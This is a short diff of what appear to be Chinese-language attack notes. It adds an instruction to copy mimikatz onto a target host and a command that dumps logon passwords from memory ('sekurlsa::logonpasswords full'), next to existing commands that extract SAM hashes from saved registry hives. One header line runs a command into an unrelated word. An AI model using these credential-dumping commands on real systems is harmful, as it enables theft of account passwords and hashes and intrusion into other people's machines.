@@ -15,3 +15,7 @@ mimikatz "lsadump::sam /sam:Sam.hiv /system:Sys.hiv" exitsaulGoodman
 
 
 mimikatz "lsadump::sam /sam:Sam.hiv /system:Sys.hiv" exit
+
+把mimikatz拖到目标主机获取密码
+
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "exit"
